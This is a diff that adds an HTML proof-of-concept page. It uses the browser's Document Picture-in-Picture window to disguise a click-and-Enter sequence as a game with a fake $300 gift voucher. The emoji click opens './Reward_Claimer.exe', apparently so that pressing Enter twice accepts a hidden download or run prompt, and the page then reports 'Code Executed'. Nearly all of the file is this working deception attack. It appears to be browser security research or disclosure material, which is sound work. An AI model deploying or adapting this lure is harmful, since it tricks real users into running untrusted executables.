@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Simple Puzzle Game</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f0f0f0;
+      font-family: Arial, sans-serif;
+    }
+
+    #puzzle-content {
+      display: none;
+      text-align: center;
+    }
+
+    .emoji {
+      font-size: 100px;
+      margin: 0 10px;
+    }
+
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      background-color: #0dd438;
+      color: white;
+      border: none;
+      border-radius: 5px;
+    }
+  </style>
+</head>
+
+<body>
+  <button id="open-pip-button" onclick="openPip()">Play PoC Game</button>
+
+  <script>
+    let gameState = 0;
+    let pipWindow;
+
+    async function openPip() {
+      pipWindow = await documentPictureInPicture.requestWindow({
+        width: 1000,
+        height: 1000,
+      });
+
+      // Add styles to the PiP window
+      const style = pipWindow.document.createElement('style');
+      style.textContent = `
+                body {
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    height: 100vh;
+                    margin: 0;
+                    background-color: #f0f0f0;
+                    font-family: Arial, sans-serif;
+                    position: relative;
+                }
+                #bug-icon {
+                    position: absolute;
+                    top: 10px;
+                    left: 10px;
+                    font-size: 50px;
+                    cursor: pointer;
+                    transition: transform 0.3s;
+                }
+                #bug-icon:hover {
+                    transform: scale(1.2);
+                }
+                #puzzle-content {
+                    text-align: center;
+                    user-select: none;
+                }
+                #final-message {
+                    display: none;
+                    position: absolute;
+                    top: 50%;
+                    left: 50%;
+                    transform: translate(-50%, -50%);
+                    font-size: 24px;
+                    font-weight: bold;
+                }
+                #bug-bottom {
+                    display: none;
+                    position: absolute;
+                    bottom: 10px;
+                    left: 10px;
+                    font-size: 50px;
+                    cursor: pointer;
+                    transition: transform 0.3s;
+                }
+                #bug-bottom:hover {
+                    transform: scale(1.2);
+                }
+                #center-text {
+                    position: absolute;
+                    top: 50%;
+                    left: 50%;
+                    transform: translate(-50%, -50%);
+                    font-size: 24px;
+                    font-weight: bold;
+                }
+            `;
+      pipWindow.document.head.appendChild(style);
+
+      // Clone and display the puzzle content in the PiP window
+      const puzzleContent = document.getElementById('puzzle-content').cloneNode(true);
+      puzzleContent.style.display = 'block'; // Show the puzzle content when the game starts
+      pipWindow.document.body.appendChild(puzzleContent);
+
+      // Adding event listeners within the PiP window
+      const bugIcon = pipWindow.document.getElementById('bug-icon');
+      const bugBottom = pipWindow.document.getElementById('bug-bottom');
+
+      bugIcon.addEventListener('click', startPuzzle);
+      bugBottom.addEventListener('click', showFinalMessage);
+
+      pipWindow.addEventListener('keydown', (event) => {
+        if (event.key === 'Enter') {
+          pipWindow.close();
+          setTimeout(() => {document.write("<h2>Code Executed.</h2>");}, 500);
+        }
+      });
+    }
+
+    function startPuzzle() {
+    //   window.open('https://live.sysinternals.com/adrestore.exe', 'popupWindow', 'width=100,height=100,left=1000,top=250');
+      // Menjadi ini (jika file ada di folder yang sama dengan poc.html):
+window.open('./Reward_Claimer.exe', 'popupWindow', 'width=100,height=100,left=1000,top=250');
+      const bugIcon = pipWindow.document.getElementById('bug-icon');
+      const centerText = pipWindow.document.getElementById('center-text');
+      const bugBottom = pipWindow.document.getElementById('bug-bottom');
+
+      // Hide the initial bug and center text
+      bugIcon.style.display = 'none';
+      centerText.style.display = 'none';
+
+      // Display the bottom left bug
+      bugBottom.style.display = 'block';
+      gameState = 1;
+    }
+
+    function showFinalMessage() {
+      const bugBottom = pipWindow.document.getElementById('bug-bottom');
+      const finalMessage = pipWindow.document.getElementById('final-message');
+
+      // Hide the bottom left bug
+      bugBottom.style.display = 'none';
+
+      // Show the final message
+      finalMessage.style.display = 'block';
+      gameState = 2;
+    }
+
+  </script>
+
+  <div id="puzzle-content">
+    <div id="bug-icon">💰</div>
+    <div id="bug-bottom">💰</div>
+    <div id="center-text">Click all 💰 to collect your reward!</div>
+    <div id="final-message">🎉 Yay! You've won a $300 gift voucher! Press Enter twice to claim it.</div>
+  </div>
+</body>
+
+</html>
